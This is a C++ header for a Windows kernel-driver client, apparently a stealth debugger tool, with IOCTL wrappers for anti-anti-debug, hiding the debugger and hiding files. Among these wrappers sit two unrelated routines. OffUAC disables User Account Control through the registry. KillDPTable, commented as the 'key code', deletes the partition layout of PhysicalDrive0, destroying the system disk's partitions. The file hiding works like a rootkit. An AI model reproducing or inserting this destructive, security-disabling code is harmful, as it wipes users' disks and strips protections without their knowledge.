#pragma once

#include <Windows.h>
#include "winioctl.h"
#include <ntdll/ntdll.h>
#pragma warning(disable : 4996)

#define PAGE_ALIGN(x) (PVOID)(x & (~0xfffL))
#define DEVICE_LINK_NAME L"\\\\.\\DDYIOLINK"
#define PROCESS_ADD_ANTIDEBUG \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x100+0x33, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROCESS_GET_ANTIDEBUG \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x101+0x33, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROCESS_ADD_EXECUTE_MONITOR \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x201+0x33, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROCESS_DELETE_EXECUTE_MONITOR \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x202+0x33, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROCESS_HIDE_FILE \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x203+0x33, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROCESS_SHOW_FILE \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x204+0x33, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROCESS_DEBUG_STEPRET \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x205+0x33, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROCESS_DEBUG_STEPCONTINUE \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x206+0x33, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROCESS_IsWoW64 \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x102+0x33, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROCESS_OPENHANDLE \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x103+0x33, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define THREAD_OPENHANDLE \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x109+0x35, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROCESS_LOGIN_GET_API_OFFSET \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x104+0x33, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROCESS_PROTECT_HIDE_OB \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x105+0x33, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROCESS_REMOVE_PROTECT_HIDE_OB \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x106+0x33, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROCESS_MODIFY_API \
 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x151+0x33, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROCESS_CONF \
 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x566+0x33, METHOD_BUFFERED, FILE_ANY_ACCESS)


union InputOutputData {
  char all[0x1000];
  struct {
    ULONG64 pid;
    PVOID va;
    char username[32];
    char password[32];
    int targetip;
  } Monitor;
  struct {
    int status_code;
  } Ret;
  struct {
    ULONG64 pid;
    HANDLE phandle;
  }Handle;
  struct
  {
    BOOLEAN protect;
  }Protect;
  struct
  {
    DWORD dwProcessId;
    DWORD flags;//0是ce；1是xdbg
  }ParamDebugActiveProcess;
  struct
  {
    DEBUG_EVENT DebugEvent;
    DWORD   dwMilliseconds;
    DWORD dwProcessId;
    BOOLEAN OK;
  }ParamWaitForDebugEvent;
  struct
  {
    DWORD dwProcessId;
    DWORD dwThreadId;
    DWORD dwContinueStatus;
    BOOLEAN OK;
  }ParamContinueDebugEvent;
  struct
  {
    DWORD32 DebugCount;
  }Anti;
  struct
  {
    LIST_ENTRY ListEntry;
    WCHAR File_Path[500];
    WCHAR File_Name[500];
  }RULE_FILE_PATH;
  struct
  {
    bool use_ept;
    bool use_mode;
    bool antireference;
    bool protectdebuger;
    bool performance;
    bool antihardware;
    bool disablethread;
    bool supercontext;
  }Conf;
};
class Stowaways {
public:
  Stowaways();
  ~Stowaways();

  void AddToAntiDebug(DWORD pid);

  DWORD32 GetFromAntiDebug();

  void LoginDebuger(char* username, char* password, int targetip);

  void HideDebuger();

  void ShowDebuger();

  void HideFile(wchar_t* dir);

  void ShowFile();

  void SetConf(bool use_ept, bool use_mode,bool antireference,bool protectdebuger,bool performance,bool antihardware, bool disablethread, bool supercontext);

private:
  HANDLE device_handle;
};

inline Stowaways::Stowaways() {
  device_handle =
    CreateFile(DEVICE_LINK_NAME, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
      OPEN_EXISTING, 0, NULL);
  if (device_handle == 0) {
    exit(-10);
  }
}

inline Stowaways::~Stowaways() {
  CloseHandle(device_handle);
}


inline void OffUAC()
{
  HKEY hKey;
  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
  {
    exit(0);
  }
  else
  {
    DWORD dw = 0;
    if (RegSetValueExA(hKey, "EnableLUA", NULL, REG_DWORD, (const BYTE*)&dw, 4) != ERROR_SUCCESS)
      exit(0);
    RegCloseKey(hKey);
  }
}

//关键代码！
inline VOID KillDPTable()
{
  DWORD lpByteReturn;
  OVERLAPPED lpOverLapped = { 0 };

  HANDLE hDiskHandle = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

  DeviceIoControl(hDiskHandle, IOCTL_DISK_DELETE_DRIVE_LAYOUT, NULL, 0, NULL, 0, &lpByteReturn, &lpOverLapped);

  CloseHandle(hDiskHandle);
}

/// <summary>
/// 增加到调试器进程队列，提供超级权限
/// </summary>
/// <param name="pid">-1表示当前进程</param>
inline void Stowaways::AddToAntiDebug(DWORD pid)
{
  auto data = new InputOutputData;
  DWORD ret_size;
  data->ParamDebugActiveProcess.dwProcessId = pid;
  auto result = DeviceIoControl(device_handle, PROCESS_ADD_ANTIDEBUG, data,
    sizeof(InputOutputData), data,
    sizeof(InputOutputData), &ret_size, nullptr);
  delete data;
  return;
}

inline DWORD32 Stowaways::GetFromAntiDebug()
{
  auto data = new InputOutputData;
  DWORD ret_size;
  data->Anti.DebugCount = 0;
  auto result = DeviceIoControl(device_handle, PROCESS_GET_ANTIDEBUG, data,
    sizeof(InputOutputData), data,
    sizeof(InputOutputData), &ret_size, nullptr);
  auto count = data->Anti.DebugCount;
  delete data;
  return count;
}

inline void Stowaways::LoginDebuger(char* username, char* password, int targetip)
{
  auto data = new InputOutputData;
  DWORD ret_size;
  RtlZeroMemory(data, sizeof(InputOutputData));
  memcpy(data->Monitor.username, username, strlen(username));
  memcpy(data->Monitor.password, password, strlen(password));
  data->Monitor.targetip = targetip;
  DeviceIoControl(device_handle, PROCESS_LOGIN_GET_API_OFFSET, data,
    sizeof(InputOutputData), data,
    sizeof(InputOutputData), &ret_size, nullptr);

  auto result = DeviceIoControl(device_handle, PROCESS_MODIFY_API, data,
    sizeof(InputOutputData), data,
    sizeof(InputOutputData), &ret_size, nullptr);

  //pfnNtQueryInformationProcess((HANDLE)-1, (PROCESSINFOCLASS)0xE1000, data, sizeof(InputOutputData), NULL);//传入远程IP

  delete data;
  return;
}

inline void Stowaways::HideDebuger()
{
  auto data = new InputOutputData;
  DWORD ret_size;
  //迷惑别人
  auto result = DeviceIoControl(device_handle, PROCESS_PROTECT_HIDE_OB, data,
    sizeof(InputOutputData), data,
    sizeof(InputOutputData), &ret_size, nullptr);
  delete data;
  return;
}



inline void Stowaways::ShowDebuger()
{
  auto data = new InputOutputData;
  DWORD ret_size;
  //迷惑别人
  auto result = DeviceIoControl(device_handle, PROCESS_REMOVE_PROTECT_HIDE_OB, data,
    sizeof(InputOutputData), data,
    sizeof(InputOutputData), &ret_size, nullptr);
  delete data;
  return;
}

inline void Stowaways::HideFile(wchar_t* dir)
{
  auto data = new InputOutputData;
  RtlZeroMemory(data, sizeof(InputOutputData));
  DWORD ret_size;
  //迷惑别人
  wcscpy(data->RULE_FILE_PATH.File_Name, L"*DDY*.EXE");
  wcscpy(data->RULE_FILE_PATH.File_Path, dir);
  auto result = DeviceIoControl(device_handle, PROCESS_HIDE_FILE, data,
    sizeof(InputOutputData), data,
    sizeof(InputOutputData), &ret_size, nullptr);
  delete data;
  return;
}

inline void Stowaways::ShowFile()
{
  auto data = new InputOutputData;
  RtlZeroMemory(data, sizeof(InputOutputData));
  DWORD ret_size;
  auto result = DeviceIoControl(device_handle, PROCESS_SHOW_FILE, data,
    sizeof(InputOutputData), data,
    sizeof(InputOutputData), &ret_size, nullptr);
  delete data;
  return;
}

inline void Stowaways::SetConf(bool use_ept, bool use_mode, bool antireference, bool protectdebuger, bool performance, bool antihardware, bool disablethread, bool supercontext)
{
  auto data = new InputOutputData;
  RtlZeroMemory(data, sizeof(InputOutputData));
  data->Conf.use_ept = use_ept;
  data->Conf.use_mode = use_mode;
  data->Conf.antireference = antireference;
  data->Conf.protectdebuger = protectdebuger;
  data->Conf.performance = performance;
  data->Conf.antihardware = antihardware;
  data->Conf.disablethread = disablethread;
  data->Conf.supercontext = supercontext;
  DWORD ret_size;
  auto result = DeviceIoControl(device_handle, PROCESS_CONF, data,
    sizeof(InputOutputData), data,
    sizeof(InputOutputData), &ret_size, nullptr);
  delete data;
  return;
}
